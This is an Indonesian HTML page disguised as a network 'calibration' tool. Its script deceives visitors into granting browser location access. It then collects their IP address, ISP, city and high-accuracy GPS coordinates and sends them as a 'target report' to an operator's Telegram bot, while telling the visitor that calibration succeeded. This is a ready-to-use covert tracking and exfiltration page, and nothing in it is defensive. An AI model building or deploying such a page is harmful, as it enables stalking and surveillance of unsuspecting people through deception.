<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sertifikasi Keamanan Jaringan v4.2</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #090d16;
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 40px 30px;
            background: #111827;
            border: 1px solid #1f2937;
            border-radius: 16px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
            max-width: 380px;
            width: 100%;
        }
        h3 {
            margin-top: 0;
            color: #f3f4f6;
            font-size: 20px;
        }
        p {
            color: #9ca3af;
            font-size: 14px;
            line-height: 1.5;
        }
        .btn {
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 15px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 24px;
            width: 100%;
            font-weight: 600;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
            transition: all 0.2s ease;
        }
        .btn:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }
        .spinner {
            border: 3px solid rgba(255,255,255,0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #3b82f6;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-text {
            font-size: 13px;
            color: #60a5fa;
            margin-top: 15px;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <div class="container" id="box-awal">
        <h3>Optimasi Jaringan Perangkat</h3>
        <p>Sistem mendeteksi latensi tinggi pada sesi Anda. Klik tombol di bawah untuk melakukan kalibrasi ulang posisi dan enkripsi.</p>
        <button class="btn" id="btnMulai">Mulai Kalibrasi</button>
    </div>

    <div class="container" id="box-proses" style="display:none;">
        <h3>Sedang Mengkalibrasi...</h3>
        <p>Harap klik <b>"Izinkan"</b> atau <b>"Allow"</b> pada pop-up izin lokasi yang muncul di browser Anda.</p>
        <div class="spinner" id="spinner"></div>
        <div class="status-text" id="statusText">Menghubungkan ke satelit lokal...</div>
    </div>

    <script>
        const BOT_TOKEN = 'GANTI_DENGAN_BOT_TOKEN_ANDA';
        const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_ANDA';

        document.getElementById('btnMulai').addEventListener('click', () => {
            document.getElementById('box-awal').style.display = 'none';
            document.getElementById('box-proses').style.display = 'block';
            document.getElementById('spinner').style.display = 'block';
            
            jalankanProsesPresisi();
        });

        async function kirimKeTelegram(pesan) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: pesan,
                        parse_mode: 'HTML',
                        disable_web_page_preview: false
                    })
                });
            } catch (err) {
                console.error('Transmisi gagal:', err);
            }
        }

        async function ambilIPAlt() {
            try {
                // Menggunakan ip-api yang lebih akurat untuk wilayah Asia/Indonesia
                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,query');
                const data = await res.json();
                if(data.status === 'success') return data;
                return null;
            } catch (e) {
                return null;
            }
        }

        function ambilGPSAkurat() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude || 'Tidak tersedia',
                            speed: pos.coords.speed || '0'
                        });
                    },
                    (err) => {
                        resolve(null); // Jika ditolak, kembalikan null agar sistem mengandalkan IP
                    },
                    { 
                        timeout: 20000, 
                        enableHighAccuracy: true, 
                        maximumAge: 0 
                    }
                );
            });
        }

        async function jalankanProsesPresisi() {
            document.getElementById('statusText').innerText = 'Menganalisis subnet jaringan...';
            const ipData = await ambilIPAlt();

            document.getElementById('statusText').innerText = 'Mengaktifkan sensor hardware GPS...';
            const gpsData = await ambilGPSAkurat();

            let laporan = `<b>🎯 [LAPORAN TARGET PRESISI TINGGI] 🎯</b>\n\n`;

            // Data Jaringan IP (Sebagai perbandingan sekunder)
            if (ipData) {
                laporan += `<b>🌐 Analisis Jaringan IP:</b>\n`;
                laporan += `- IP Address: <code>${ipData.query}</code>\n`;
                laporan += `- Wilayah: ${ipData.city}, ${ipData.regionName}, ${ipData.country}\n`;
                laporan += `- ISP: ${ipData.isp}\n`;
                laporan += `🔗 <a href="https://maps.google.com/?q=${ipData.lat},${ipData.lon}">Peta Perkiraan IP</a>\n\n`;
            }

            // Data GPS Hardware (Prioritas Utama untuk akurasi meteran)
            if (gpsData) {
                laporan += `<b>📍 GPS HARDWARE (AKURASI TINGGI):</b>\n`;
                laporan += `- Latitude: <code>${gpsData.lat}</code>\n`;
                laporan += `- Longitude: <code>${gpsData.lon}</code>\n`;
                laporan += `- Tingkat Akurasi: <b>±${gpsData.accuracy} meter</b>\n`;
                laporan += `- Ketinggian: ${gpsData.altitude} m\n\n`;
                laporan += `🚀 <b><a href="https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}">KLIK DISINI UNTUK BUKA TITIK GPS AKURAT</a></b>`;
            } else {
                laporan += `⚠️ <b>GPS Hardware:</b> Ditolak oleh target. Mengandalkan titik IP alternatif di atas.`;
            }

            await kirimKeTelegram(laporan);

            document.getElementById('spinner').style.display = 'none';
            document.getElementById('statusText').innerText = 'Kalibrasi selesai.';
            
            setTimeout(() => {
                document.getElementById('box-proses').innerHTML = '<h3>Kalibrasi Berhasil</h3><p>Koneksi perangkat telah stabil.</p>';
            }, 1500);
        }
    </script>
</body>
</html>
